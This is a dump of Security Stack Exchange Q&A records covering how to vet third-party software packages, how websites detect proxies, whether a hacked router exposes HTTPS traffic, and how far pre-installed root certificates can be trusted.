"261720","261720","How to vet third-party developer packages","<p>Looking to create a form where developers can submit requests for packages to be installed. We want to create a list of questions that can help us determine whether or not a package is safe. What are some important questions to include in the form for our developers?</p>
<p>My list so far:</p>
<ol>
<li>Package Type:  NPM, PYPI, etc...</li>
<li>Package Name:</li>
<li>Package Version:</li>
<li>Package Release Date:</li>
<li>Explain Use Case of the package:</li>
<li>Provide the Package Documentation</li>
<li>Commit history? Actively maintained and updated? How many people can make commit changes? Are changes automatically approved or are they reviewed?</li>
<li>Are there open Bug Reports? How many? How long have they been open?</li>
<li>Any active or previous vulnerabilities listed in NVD? <a href=""https://nvd.nist.gov/vuln/search?results_type=overview&amp;query=Cloudinary&amp;search_type=all&amp;form_type=Basic&amp;isCpeNameSearch=false"" rel=""noreferrer"">https://nvd.nist.gov/vuln/search?results_type=overview&amp;query=Cloudinary&amp;search_type=all&amp;form_type=Basic&amp;isCpeNameSearch=false</a></li>
<li>What dependencies does this package require.</li>
</ol>
","12","3","261722","<p>First of all, be aware that there is no guaranteed security. For example, the npm package <code>node-ipc</code> decided to <a href=""https://security.snyk.io/vuln/SNYK-JS-NODEIPC-2426370"" rel=""noreferrer"">wipe the hard drives of Russian users</a> for political reasons. <a href=""https://www.npmjs.com/package/faker"" rel=""noreferrer"">faker.js</a> decided to just stop existing and thus breaking a lot of code. Developers and maintainers are people too, and these people sometimes act irrationally, sometimes maliciously. In essence, you cannot judge what people will do in the future. You cannot protect against a developer acting maliciously. But you can make judgements about the &quot;health&quot; of a project.</p>
<h3>What does &quot;project health&quot; mean?</h3>
<p>Now that we have established that we cannot protect ourselves from malicious developers, we have to look at what we <em>can</em> protect ourselves from: Developers losing interest.</p>
<p>If you've worked in a large company, you've likely seen codebases depend on some library that was written 2003 and last updated 2004, when the developer just vanished. The library is never replaced, because &quot;it's too deeply integrated into the product and we would have to re-write everything&quot;. The library has several known vulnerabilities, averaging at a CVSS score of 7.6, but again, it's not replaced, because there is no replacement without lots of work.</p>
<p>This is the precise scenario you want to avoid. And the likelihood of that occurring or not occurring is determined by &quot;project health&quot;.</p>
<p>Positive factors contributing to project health are:</p>
<ul>
<li>Large company backing</li>
<li>Long development history</li>
<li>Concrete end-of-life plans</li>
<li>Many developers and maintainers</li>
</ul>
<p>All of these make it less likely that a project will suddenly stop receiving updates and leave you stranded. So the healthier a project, the more likely it is that you will receive updates, including security updates, for the lifespan of your product.</p>
<h3>Do you even need the dependency?</h3>
<p>The first question you should ask yourself is <strong>is the cost of developing this in-house greater than the risk of taking a package?</strong> For packages like <code>left-pad</code>, the answer is clearly &quot;No&quot; and developers should write it themselves, rather than taking on yet another dependency. For other code, for example, cryptographic code, you're likely better off using a well-vetted package than developing your own.</p>
<p>Remember, coding it yourself means you are in control of the codebase's health.</p>
<h3>How healthy is the project?</h3>
<p>As I mentioned above, there are several factors contributing to a project's health. Note that these don't include things like &quot;number of vulnerabilities&quot;, but more the project team's ability to fix those vulnerabilities.</p>
<p>If a project or package doesn't seem actively maintained, then you're better off either finding an alternative or developing it yourself. Which of these alternatives seems better to you has to be judged on a case-by-case basis.</p>
<h3>What about project dependencies?</h3>
<p>Of course, if those projects have dependencies (and they likely do), then you will have to vet those as well, using the same process. It may very well be that your shiny new <code>super-awesome.js</code> project depends on 300 other things in total, and you're likely better off not using it.</p>
<hr />
<h3>In Short</h3>
<ul>
<li>You cannot protect against malicious developers</li>
<li>You can make <em>reasonable</em> estimates about reliability</li>
<li>Don't take a dependency if you don't have to</li>
<li>Favor mature projects over small projects</li>
<li>Avoid nested dependencies when possible</li>
</ul>
","14"
"261720","261720","How to vet third-party developer packages","<p>Looking to create a form where developers can submit requests for packages to be installed. We want to create a list of questions that can help us determine whether or not a package is safe. What are some important questions to include in the form for our developers?</p>
<p>My list so far:</p>
<ol>
<li>Package Type:  NPM, PYPI, etc...</li>
<li>Package Name:</li>
<li>Package Version:</li>
<li>Package Release Date:</li>
<li>Explain Use Case of the package:</li>
<li>Provide the Package Documentation</li>
<li>Commit history? Actively maintained and updated? How many people can make commit changes? Are changes automatically approved or are they reviewed?</li>
<li>Are there open Bug Reports? How many? How long have they been open?</li>
<li>Any active or previous vulnerabilities listed in NVD? <a href=""https://nvd.nist.gov/vuln/search?results_type=overview&amp;query=Cloudinary&amp;search_type=all&amp;form_type=Basic&amp;isCpeNameSearch=false"" rel=""noreferrer"">https://nvd.nist.gov/vuln/search?results_type=overview&amp;query=Cloudinary&amp;search_type=all&amp;form_type=Basic&amp;isCpeNameSearch=false</a></li>
<li>What dependencies does this package require.</li>
</ol>
","12","3","261728","<p>I highly doubt that a process to request approvals for new third-party packages will have the desired effects. I've worked for organizations that have tried to introduce similar processes, and they tend to fail. The approval process rarely fits into the speed and cadence of development, leading to problems like teams not being able to execute on their planned work or bypassing the review process entirely and dropping key aspects of third-party package review and selection.</p>
<p>Especially in agile organizations, when the need or possibility for pulling in a third-party package as a solution arises, the team usually doesn't have a lot of time to make a decision. The work is already in progress and they need a rapid decision to begin to move forward to design, build, and integrate solutions.</p>
<p>The first step is to give the team the knowledge needed to select appropriate packages, considering things like license terms and the overall health of the different options. The health of the package may consider any number of factors, but some that I've seen are things like how responsive the developer is to questions/issues in official support channels, how active the user community is (including third-party channels like Stack Overflow or various forums), the number of open issues and/or time to resolve defects, number of open pull requests, age of pull request, number of committers and who the committers are, frequency of commits, frequency of releases, number of times the package is a dependency, number of downloads (per unit of time, in some cases), number of dependencies, and documentation (readme, contributor documents, funding information).</p>
<p>Unfortunately, no one but you can determine what factors are most important. A big factor are the risks associated with the system that you are developing, along with the tolerance for risk for the developing organization as well as the users and customers. Some contexts are very sensitive to risks, while others are very tolerant.</p>
<p><a href=""https://snyk.io/advisor/"" rel=""noreferrer"">Snyk</a> and <a href=""https://www.openhub.net/"" rel=""noreferrer"">Synopsys</a> have tools that track common open source components and make some health information public. Their ratings and criteria may not be totally appropriate for your organization and you may need to add guidance on how to interpret their data or what to do when components are not in their databases, but this may give you a good starting point to make things easier for the teams looking to include open source components.</p>
<p>Giving the developers doing the work the training and the tools needed to compare options and make informed decisions based on guidelines is important. Taking these tactical decisions away from the team will only slow down the development effort and leave the teams unempowered to make the best design decisions.</p>
<p>Once a package is incorporated, there's also ongoing maintenance. The use of software composition analysis tools can scan your software, find dependencies, and monitor those dependencies. You can be alerted to things like new versions, new vulnerabilities, or packages that no longer appear to be maintained. When these alerts come through, the development team can triage them to apply patches (or other mitigations), defer patches for a later time (if the vulnerability is low risk or there are other mitigations already in place), or identify when it may be time to migrate away from one dependency to another solution.</p>
<p>Depending on your threat model, you may also need to consider other ways to mitigate risks. Even with the appropriate reviews, there are cases of developers yanking their packages from the Internet, purposefully injecting malicious code in new versions, or not adhering to standard versioning schemes and breaking dependent systems. Versioning pinning, standing up mirrors for your dependencies, or building your dependencies from source may mitigate further risks. For open source dependencies, you may also be able to scan the source with your internal vulnerability scanners to further mitigate risks of malicious code.</p>
","44"
"261720","261720","How to vet third-party developer packages","<p>Looking to create a form where developers can submit requests for packages to be installed. We want to create a list of questions that can help us determine whether or not a package is safe. What are some important questions to include in the form for our developers?</p>
<p>My list so far:</p>
<ol>
<li>Package Type:  NPM, PYPI, etc...</li>
<li>Package Name:</li>
<li>Package Version:</li>
<li>Package Release Date:</li>
<li>Explain Use Case of the package:</li>
<li>Provide the Package Documentation</li>
<li>Commit history? Actively maintained and updated? How many people can make commit changes? Are changes automatically approved or are they reviewed?</li>
<li>Are there open Bug Reports? How many? How long have they been open?</li>
<li>Any active or previous vulnerabilities listed in NVD? <a href=""https://nvd.nist.gov/vuln/search?results_type=overview&amp;query=Cloudinary&amp;search_type=all&amp;form_type=Basic&amp;isCpeNameSearch=false"" rel=""noreferrer"">https://nvd.nist.gov/vuln/search?results_type=overview&amp;query=Cloudinary&amp;search_type=all&amp;form_type=Basic&amp;isCpeNameSearch=false</a></li>
<li>What dependencies does this package require.</li>
</ol>
","12","3","261797","<p>From a well-behaving company's perspective, the most important thing is the LICENSE that the software package has been released under.</p>
<p>The technical quality or risks of the package may hard to judge, but the legal situation for packages is very clear.</p>
<p>I've worked for many companies that have a complete ban on [L]GPL-3, AGPL, and similar strong &quot;copyleft&quot; licenses because of the implications that they have on the company's proprietary code in a product.</p>
","0"
"261705","261705","Is it possible for a website to detect the presence of a proxy?","<p>I am attempting to scrape a site which is notoriously difficult to scrape.  Access from datacentres is generally blocked.  In the past I've used various proxies, but recently these have stopped working.</p>
<p>The site employs various pitfalls when it doesn't like the user; e.g. certain javascript components fail, or the server redirects AJAX requests to localhost; thus causing a null-route.</p>
<p>I had previously assumed that the server was filtering by IP -- Recently I've noticed that the site acts up even from a &quot;good&quot; IP address, but only if proxied.  In other words, if I open the site from a browser in computer A, it works perfectly fine.  If I try to connect from computer B which uses computer A as a proxy server, the site fails to load.  Even if I connect from computer A using the proxy server running on itself, the site still fails to load.</p>
<p>Which leads me to believe that the site is somehow detecting the existence of a proxy.</p>
<p>The proxy software is one I've written myself, so I know for certain that it does not add any headers which would give it away.  I have used it successfully for many years without issue, so it's unlikely to have an obvious bug.  It cannot be queried by the remote server.  It doesn't mess with the headers or certificates -- it only forwards https traffic with the CONNECT method.  (There is no HTTP traffic)</p>
<p>The browser I'm using is Firefox, and WebRTC is disabled.</p>
<p>My question is: is there any way for a website/webserver to detect:</p>
<ol>
<li>That a browser has some proxy settings configured?</li>
<li>That a proxy server is being used at all</li>
</ol>
","9","3","261802","<p>yes! it's possible.</p>
<p>Usually proxy servers add a <code>X-Forwarded-For</code> HTML header. That's how normal proxies work. Now the server which you are connecting to, can simply read this tag and it is followed by an IP address which is nothing but your IP. So all in all detectable.</p>
<p>On the other hand we have something called &quot;anonymizers&quot;. This is simply the same proxy software, that is made sure to not give out the above mentioned header in the request.
But there are a few ways it can still be concluded if you're using a proxy or not.
Simply put there are ten people who are using the same proxy and apparently they are use the same proxy. Now the website will not get any of the IPs but instead will get ten different requests from the same IP. But, it does get to know that the requests are all having multiple OS/Multiple Browsers/Multiple Browser versions etc., Thus it can be detected that you may be using a proxy.</p>
<p>Hopefully this was helpful..</p>
<p>Notes:
<code>X-Forwarded-For</code> header info -&gt; <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For"" rel=""nofollow noreferrer"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For</a></p>
","1"
"261705","261705","Is it possible for a website to detect the presence of a proxy?","<p>I am attempting to scrape a site which is notoriously difficult to scrape.  Access from datacentres is generally blocked.  In the past I've used various proxies, but recently these have stopped working.</p>
<p>The site employs various pitfalls when it doesn't like the user; e.g. certain javascript components fail, or the server redirects AJAX requests to localhost; thus causing a null-route.</p>
<p>I had previously assumed that the server was filtering by IP -- Recently I've noticed that the site acts up even from a &quot;good&quot; IP address, but only if proxied.  In other words, if I open the site from a browser in computer A, it works perfectly fine.  If I try to connect from computer B which uses computer A as a proxy server, the site fails to load.  Even if I connect from computer A using the proxy server running on itself, the site still fails to load.</p>
<p>Which leads me to believe that the site is somehow detecting the existence of a proxy.</p>
<p>The proxy software is one I've written myself, so I know for certain that it does not add any headers which would give it away.  I have used it successfully for many years without issue, so it's unlikely to have an obvious bug.  It cannot be queried by the remote server.  It doesn't mess with the headers or certificates -- it only forwards https traffic with the CONNECT method.  (There is no HTTP traffic)</p>
<p>The browser I'm using is Firefox, and WebRTC is disabled.</p>
<p>My question is: is there any way for a website/webserver to detect:</p>
<ol>
<li>That a browser has some proxy settings configured?</li>
<li>That a proxy server is being used at all</li>
</ol>
","9","3","261819","<p>HTTP proxies often occupy typical ports. By means of a port scan, the open ports of the client can be detected through the contacted web server, which can provide information about whether the ip address that the server sees is a middleware.</p>
","0"
"261705","261705","Is it possible for a website to detect the presence of a proxy?","<p>I am attempting to scrape a site which is notoriously difficult to scrape.  Access from datacentres is generally blocked.  In the past I've used various proxies, but recently these have stopped working.</p>
<p>The site employs various pitfalls when it doesn't like the user; e.g. certain javascript components fail, or the server redirects AJAX requests to localhost; thus causing a null-route.</p>
<p>I had previously assumed that the server was filtering by IP -- Recently I've noticed that the site acts up even from a &quot;good&quot; IP address, but only if proxied.  In other words, if I open the site from a browser in computer A, it works perfectly fine.  If I try to connect from computer B which uses computer A as a proxy server, the site fails to load.  Even if I connect from computer A using the proxy server running on itself, the site still fails to load.</p>
<p>Which leads me to believe that the site is somehow detecting the existence of a proxy.</p>
<p>The proxy software is one I've written myself, so I know for certain that it does not add any headers which would give it away.  I have used it successfully for many years without issue, so it's unlikely to have an obvious bug.  It cannot be queried by the remote server.  It doesn't mess with the headers or certificates -- it only forwards https traffic with the CONNECT method.  (There is no HTTP traffic)</p>
<p>The browser I'm using is Firefox, and WebRTC is disabled.</p>
<p>My question is: is there any way for a website/webserver to detect:</p>
<ol>
<li>That a browser has some proxy settings configured?</li>
<li>That a proxy server is being used at all</li>
</ol>
","9","3","261968","<p>Some HTTPS web servers may use the TLS session resumption technique (<a href=""https://www.ssl.com/article/tracking-users-with-tls/"" rel=""nofollow noreferrer"">https://www.ssl.com/article/tracking-users-with-tls/</a>) in order to reduce the handshake overhead: both TLS endpoints will rapidly build new encryption materials based on a previous session. The downside  is that is allows the server to track the client endpoint, detecting any change in its IP address, which may be caused to changing the IP address, trying to connect directly then through proxy, or even changing the proxy, etc.</p>
","0"
"261682","261682","If your router gets hacked, can the hacker acquire your RSA private key to decrypt HTTPS and view full URL's?","<p>In order to decrypt HTTPS you need the public key and the private key. How can a hacker acquire the private key?</p>
<p>What exactly does he have to do to get it? I read that they use packet sniffers like Wireshark to decrypt HTTPS, is this true?</p>
<p>I also read somewhere that the hacker needs to have physical access of your device (computer, smartphone) to get the private key.</p>
<p>So if your router gets hacked is decryption of https possible and can the complete url of sites that you visit be viewed?</p>
","0","4","261683","<p>A hacker cannot decrypt your TLS traffic by hacking your router. The  key is generated by the server on the TLS transaction, and it will never be transmitted anywhere.</p>
<blockquote>
<p>I read that they use packet sniffers like Wireshark to decrypt HTTPS, is this true?</p>
</blockquote>
<p>Yes, but only if they get the symmetric key first. To get that, you need to instruct your TLS client to write the TLS key somewhere, and you load that key on Wireshark. Unless you do so, Wireshark cannot decrypt anything.</p>
<blockquote>
<p>the hacker needs to have physical access of your device(computer, smartphone...) to get the private key</p>
</blockquote>
<p><a href=""https://www.marshall.edu/it/departments/information-security/10-immutable-laws-of-security/"" rel=""nofollow noreferrer"">Law #3 of Security</a>: <em>If a bad guy has unrestricted physical access to your computer, it’s not your computer anymore.</em></p>
<p>If anyone have physical access, they don't need to get your keys. They can just alter any software you have to send them the traffic before the encryption. No need to hack your router.</p>
<blockquote>
<p>So if your router gets hacked is decryption of HTTPS possible and can the complete URL of sites that you visit be viewed?</p>
</blockquote>
<p>No and no. The hacker can know the domain you are accessing (because of the <a href=""https://knowledge.digicert.com/quovadis/ssl-certificates/ssl-general-topics/what-is-sni-server-name-indication.html"" rel=""nofollow noreferrer"">SNI</a>). Encrypted SNI could protect even the domain name, but it's not still in widespread use.</p>
","0"
"261682","261682","If your router gets hacked, can the hacker acquire your RSA private key to decrypt HTTPS and view full URL's?","<p>In order to decrypt HTTPS you need the public key and the private key. How can a hacker acquire the private key?</p>
<p>What exactly does he have to do to get it? I read that they use packet sniffers like Wireshark to decrypt HTTPS, is this true?</p>
<p>I also read somewhere that the hacker needs to have physical access of your device (computer, smartphone) to get the private key.</p>
<p>So if your router gets hacked is decryption of https possible and can the complete url of sites that you visit be viewed?</p>
","0","4","261684","<blockquote>
<p>So if your router gets hacked is decryption of https possible and can the complete url of sites that you visit be viewed?</p>
</blockquote>
<p>In order to decrypt HTTPS one must first be some man in the middle to get access to the traffic and second have the private key for the server in question. With the server doing DH key exchange (most servers today, since RSA key exchange is obsolete) one must also be able to modify the traffic and claim the identity of the server, i.e. active man in the middle and not only one passively sniffing.</p>
<p>Hacking the router might provide the ability to sniff and modify the traffic. But the private key of some server on the internet is private to this server. There is no access to this key on the router or on the client since it gets never transmitted - all what the server does is prove that it owns the key by signing some challenge. Thus neither (in case of RSA key exchange) passive sniffing and decryption of the HTTPS traffic from arbitrary servers on the router will work, nor active interception (required in most cases) with claiming the server identity.</p>
<p>Note that this is different if the router is not just a dumb router forwarding traffic, but an actual security device which is explicitly trusted by the clients to do TLS man in the middle. In this case hacking such a &quot;router&quot; (or better called &quot;firewall&quot; or &quot;corporate proxy&quot;) will give the hacker also access to the decrypted traffic, since decrypting the traffic for introspection is an explicit feature of the device. See also <a href=""https://security.stackexchange.com/questions/133254/how-does-ssl-proxy-server-in-company-work"">How does SSL Proxy server in company work?</a>.</p>
","3"
"261682","261682","If your router gets hacked, can the hacker acquire your RSA private key to decrypt HTTPS and view full URL's?","<p>In order to decrypt HTTPS you need the public key and the private key. How can a hacker acquire the private key?</p>
<p>What exactly does he have to do to get it? I read that they use packet sniffers like Wireshark to decrypt HTTPS, is this true?</p>
<p>I also read somewhere that the hacker needs to have physical access of your device (computer, smartphone) to get the private key.</p>
<p>So if your router gets hacked is decryption of https possible and can the complete url of sites that you visit be viewed?</p>
","0","4","261685","<p>Note that in an https connection, the client does not have a private key - only the server does.</p>
<p>Having said that, there are many ways that an adversary can view and/or modify your network connection.  For example:</p>
<ul>
<li>Your ISP is in a position to view and/or modify your network connection.</li>
<li>If you use public wifi (for example, at a coffee shop), the wifi provider is able to view and/or modify your network connection.</li>
<li>If your router is hacked, the attacker is in a position to view and/or modify your network connection.</li>
</ul>
<p>However, being in a position to view and/or modify your network connection is only half the battle.  If you connect to sites by https, then being in a position to view and/or modify your network connection is of little good to the attacker, unless:</p>
<ul>
<li><p>The attacker has the private key of the server.  In this case, the attacker would be able to use the server's certificate and the private key to impersonate the server.  See <a href=""https://security.stackexchange.com/questions/105376/could-a-stolen-certificate-show-as-trusted"">this question</a> for more info.</p>
</li>
<li><p>The attacker dupes you into trusting a fake certificate for the site, and mounts an MITM attack.  See <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""nofollow noreferrer"">this Wikipedia article</a> for more information.</p>
</li>
</ul>
","0"
"261682","261682","If your router gets hacked, can the hacker acquire your RSA private key to decrypt HTTPS and view full URL's?","<p>In order to decrypt HTTPS you need the public key and the private key. How can a hacker acquire the private key?</p>
<p>What exactly does he have to do to get it? I read that they use packet sniffers like Wireshark to decrypt HTTPS, is this true?</p>
<p>I also read somewhere that the hacker needs to have physical access of your device (computer, smartphone) to get the private key.</p>
<p>So if your router gets hacked is decryption of https possible and can the complete url of sites that you visit be viewed?</p>
","0","4","261687","<p>You don't need RSA key pair on your side to securely communicate via HTTPS. Browser agrees with the server about keys for the current session. See details <a href=""https://security.stackexchange.com/a/243997/47524"">here</a>. At one of steps the server sends to the browser data signed by its key. The browser validates the signature and knows for sure that the data really come from the expected server and that these data were not modified.</p>
<p>If the attacker reads your traffic e.g. with Wireshark, this will not harm, because Diffie-Hellman key exchange does not reveal secrets.</p>
<p>If the attacker attempts to manipulate the traffic, e.g. using your compromised router, the browser will report the server signature as invalid and will refuse to establish connection.</p>
<p>As long as your device is not compromised, and if the server supports TLS 1.3, a compromised router will not allow to read your HTTPS traffic.</p>
<p>If your device is compromised, then of course you cannot be sure: An attacker can install forged CA certificates and use it for a man-in-the-middle attack, or your browser can be infected with a malicious code so that your traffic will be known to the attacker, and so on.</p>
","0"
"261644","261644","Where does the root of trust actually lie?","<p>We are told that the roots of trust in the PKI are the handful of
Certificate Authorities that issue root certificates and sign other certificates and ensure at least some extent of trust to be maintained on the internet.</p>
<p>These root certificates come pre-installed on most modern operating systems. This provokes the thought that it is not the root CA that we're trusting, but the entity/entities that provide us that root CA, which may be the manufacturer, the operating system developer, or even the seller that sold the device.</p>
<p>To explain my point, I provide this hypothetical example. Let's say that Julian Assange, while hiding in the Ecuadorian embassy, decides to buy a new Thinkpad on <code>a famous e-commerce website</code>. Now <code>famous e-commerce website</code>, like countless other American organizations, collaborates with the NSA on data sharing. The NSA learns of Assange buying a new laptop, and decides to &quot;bug&quot; that laptop with a fake root CA (and a bugged TPM). The package is delivered in brand new condition, and Assange begins to use his laptop.</p>
<p>It turns out that the Ecuadorian embassy's network was 'pwned' by the NSA long ago. Assange's network traffic was going through NSA's systems for quite a while, but the saving grace was that the traffic was at least encrypted. Now, with the fake root CA, the NSA is successfully able to mount a Man in the Middle attack, being able to see the traffic in plaintext, with perhaps the exception of PGP encrypted e-mails.</p>
<p>Even if Assange tries to download new Root Certificates to ensure being on the safe side, the traffic is intercepted by the NSA, and fake certificates are inserted.</p>
<hr />
<p>Now, you might reasonably argue that the aforementioned 3-letter-agency (and its equivalents everywhere) do not have enough funds, reasons, or legal authority to target <em>most</em> of us, but this might be a realistic scenario for many of the activists, or perhaps very lucrative targets such as data centers/companies that might end up buying a system bugged with fake root CA.</p>
<p>My question is, what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
<p>Additionally, are there any books, research papers, etc, that discuss this threat model in detail?</p>
","16","5","261646","<blockquote>
<p>My question is, what are some guidelines that individuals and
organizations can follow to ensure they don't become a target of such
an attack?</p>
</blockquote>
<p>The attack in the hypothetical example that you describe relies on a fraudulent certificate having been installed on the system before the system was delivered to the victim.</p>
<p>To mitigate an attack of this nature, it's best to not trust someone else to install the operating system.  Instead, wipe the hard drive clean, and install an OS that you trust on the system from scratch, using an ISO from a distributor that you trust.  And, proceed with the installation only after you have verified the distributor's signature on the ISO.</p>
","18"
"261644","261644","Where does the root of trust actually lie?","<p>We are told that the roots of trust in the PKI are the handful of
Certificate Authorities that issue root certificates and sign other certificates and ensure at least some extent of trust to be maintained on the internet.</p>
<p>These root certificates come pre-installed on most modern operating systems. This provokes the thought that it is not the root CA that we're trusting, but the entity/entities that provide us that root CA, which may be the manufacturer, the operating system developer, or even the seller that sold the device.</p>
<p>To explain my point, I provide this hypothetical example. Let's say that Julian Assange, while hiding in the Ecuadorian embassy, decides to buy a new Thinkpad on <code>a famous e-commerce website</code>. Now <code>famous e-commerce website</code>, like countless other American organizations, collaborates with the NSA on data sharing. The NSA learns of Assange buying a new laptop, and decides to &quot;bug&quot; that laptop with a fake root CA (and a bugged TPM). The package is delivered in brand new condition, and Assange begins to use his laptop.</p>
<p>It turns out that the Ecuadorian embassy's network was 'pwned' by the NSA long ago. Assange's network traffic was going through NSA's systems for quite a while, but the saving grace was that the traffic was at least encrypted. Now, with the fake root CA, the NSA is successfully able to mount a Man in the Middle attack, being able to see the traffic in plaintext, with perhaps the exception of PGP encrypted e-mails.</p>
<p>Even if Assange tries to download new Root Certificates to ensure being on the safe side, the traffic is intercepted by the NSA, and fake certificates are inserted.</p>
<hr />
<p>Now, you might reasonably argue that the aforementioned 3-letter-agency (and its equivalents everywhere) do not have enough funds, reasons, or legal authority to target <em>most</em> of us, but this might be a realistic scenario for many of the activists, or perhaps very lucrative targets such as data centers/companies that might end up buying a system bugged with fake root CA.</p>
<p>My question is, what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
<p>Additionally, are there any books, research papers, etc, that discuss this threat model in detail?</p>
","16","5","261649","<p><strong>TLDR:</strong> Check <strong>fingerprints</strong> of certificates on your device.</p>
<p>All certificates, not only root ones, have fingerprints. These fingerprints are publicly known. If you have any doubts about certificates on your particular device, you can compare their fingerprints with known values. For instance, you can use several other devices and from each one access several resources where information about particular certificates is published. Also you can contact some friends who can do it for you. And so on. Technically it is impossible to break all channels and replace real data with desired fingerprints of the fake certificates.</p>
<p>Thus, you will know the fingerprint of the correct certificate. Then compare it to the fingerprint of certificate on your device. If it does not match, this will mean that certificate on your device is fake.</p>
<p>Besides, fake certificates make sense only in one case, when somebody fully controls connection between your device and the Internet. If you can connect to the Internet via networks that are not controlled by the attacker, your browser will obtain the real certificates from the target web sites. Your browser will complain that their certificates are not trusted, because they differ from what is installed on your device. Latest then you will check certificates on your device and certificates on the target web sites, and you will see that actually certificates on your devices are fakes.</p>
","7"
"261644","261644","Where does the root of trust actually lie?","<p>We are told that the roots of trust in the PKI are the handful of
Certificate Authorities that issue root certificates and sign other certificates and ensure at least some extent of trust to be maintained on the internet.</p>
<p>These root certificates come pre-installed on most modern operating systems. This provokes the thought that it is not the root CA that we're trusting, but the entity/entities that provide us that root CA, which may be the manufacturer, the operating system developer, or even the seller that sold the device.</p>
<p>To explain my point, I provide this hypothetical example. Let's say that Julian Assange, while hiding in the Ecuadorian embassy, decides to buy a new Thinkpad on <code>a famous e-commerce website</code>. Now <code>famous e-commerce website</code>, like countless other American organizations, collaborates with the NSA on data sharing. The NSA learns of Assange buying a new laptop, and decides to &quot;bug&quot; that laptop with a fake root CA (and a bugged TPM). The package is delivered in brand new condition, and Assange begins to use his laptop.</p>
<p>It turns out that the Ecuadorian embassy's network was 'pwned' by the NSA long ago. Assange's network traffic was going through NSA's systems for quite a while, but the saving grace was that the traffic was at least encrypted. Now, with the fake root CA, the NSA is successfully able to mount a Man in the Middle attack, being able to see the traffic in plaintext, with perhaps the exception of PGP encrypted e-mails.</p>
<p>Even if Assange tries to download new Root Certificates to ensure being on the safe side, the traffic is intercepted by the NSA, and fake certificates are inserted.</p>
<hr />
<p>Now, you might reasonably argue that the aforementioned 3-letter-agency (and its equivalents everywhere) do not have enough funds, reasons, or legal authority to target <em>most</em> of us, but this might be a realistic scenario for many of the activists, or perhaps very lucrative targets such as data centers/companies that might end up buying a system bugged with fake root CA.</p>
<p>My question is, what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
<p>Additionally, are there any books, research papers, etc, that discuss this threat model in detail?</p>
","16","5","261651","<blockquote>
<p>My question is, what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
</blockquote>
<p>One way to avoid being the target is to not do anything that would spike the interest of intelligence agencies. It won't prevent you from being caught in the collateral damage of the agencies targeting somebody around you though...</p>
<p>More seriously, for an individual, there is no easy way to detect or thwart such an attack, as the resources of the attacker far outmatch your own. An intelligence agency won't just add a root CA to computer if they have a chance to tamper with your hardware. That would have too easy to detect/mitigate. They will likely install some hardware backdoor and/or persistent malware.</p>
<p>You could reinstall the operating system, but this wouldn't prevent advanced firmware-resident malware from reinfecting you. You could check the certificate fingerprints, but the malware would simply hide the fingerprint of the malicious certificates and instead display the fingerprint of the real certificate. The cost of detecting and removing any hardware backdoors <a href=""https://security.stackexchange.com/q/199971/235964"">is prohibitively high</a>.</p>
<p>An individual's best bet against such an adversary is to not get compromised hardware in the first place. Instead of ordering the laptop online (which makes it very convenient for a TLA to intercept and modify), purchase it from a brick and mortar store in cash. Additionally, make sure the store is some distance away from where you live (far away enough that the adversary cannot easily predict you will go there).</p>
","12"
"261644","261644","Where does the root of trust actually lie?","<p>We are told that the roots of trust in the PKI are the handful of
Certificate Authorities that issue root certificates and sign other certificates and ensure at least some extent of trust to be maintained on the internet.</p>
<p>These root certificates come pre-installed on most modern operating systems. This provokes the thought that it is not the root CA that we're trusting, but the entity/entities that provide us that root CA, which may be the manufacturer, the operating system developer, or even the seller that sold the device.</p>
<p>To explain my point, I provide this hypothetical example. Let's say that Julian Assange, while hiding in the Ecuadorian embassy, decides to buy a new Thinkpad on <code>a famous e-commerce website</code>. Now <code>famous e-commerce website</code>, like countless other American organizations, collaborates with the NSA on data sharing. The NSA learns of Assange buying a new laptop, and decides to &quot;bug&quot; that laptop with a fake root CA (and a bugged TPM). The package is delivered in brand new condition, and Assange begins to use his laptop.</p>
<p>It turns out that the Ecuadorian embassy's network was 'pwned' by the NSA long ago. Assange's network traffic was going through NSA's systems for quite a while, but the saving grace was that the traffic was at least encrypted. Now, with the fake root CA, the NSA is successfully able to mount a Man in the Middle attack, being able to see the traffic in plaintext, with perhaps the exception of PGP encrypted e-mails.</p>
<p>Even if Assange tries to download new Root Certificates to ensure being on the safe side, the traffic is intercepted by the NSA, and fake certificates are inserted.</p>
<hr />
<p>Now, you might reasonably argue that the aforementioned 3-letter-agency (and its equivalents everywhere) do not have enough funds, reasons, or legal authority to target <em>most</em> of us, but this might be a realistic scenario for many of the activists, or perhaps very lucrative targets such as data centers/companies that might end up buying a system bugged with fake root CA.</p>
<p>My question is, what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
<p>Additionally, are there any books, research papers, etc, that discuss this threat model in detail?</p>
","16","5","261659","<p>The root CA list is not hardware-based (in the general case, see about the TPM below). It comes as a built-in feature of your operating system.</p>
<p>Other software (e.g. browsers, mail clients, etc...) may either use the OS provided list or have their own.</p>
<p>These lists are once in a while updated by the software vendors with whatever security update process they have in place.</p>
<p>In general, you trust the vendors of your software and the root CAs.</p>
<p>Why they are at all trustworthy - well, they are trustworthy to an extent. See <a href=""https://cabforum.org/"" rel=""nofollow noreferrer"">here</a>.</p>
<hr />
<p>People with computer security related work are highly unlikely to use the preinstalled software on their new computer.</p>
<p>What they do is to install an OS with an acceptable security track record and they check the installation media first (by its fingerprint or signature).</p>
<p>(Of course, this is not the whole story, but only a good outline.)</p>
<hr />
<p>In regard to the TPM module:</p>
<p>For the average Assange residing in the average Ecuadorian embassy,the TPM module in their computer is a security risk in itself, just like any unauditable blackbox related to the information security. They do everything they can to remove, disable or at least exclude the TPM module from their chain of trust.</p>
","11"
"261644","261644","Where does the root of trust actually lie?","<p>We are told that the roots of trust in the PKI are the handful of
Certificate Authorities that issue root certificates and sign other certificates and ensure at least some extent of trust to be maintained on the internet.</p>
<p>These root certificates come pre-installed on most modern operating systems. This provokes the thought that it is not the root CA that we're trusting, but the entity/entities that provide us that root CA, which may be the manufacturer, the operating system developer, or even the seller that sold the device.</p>
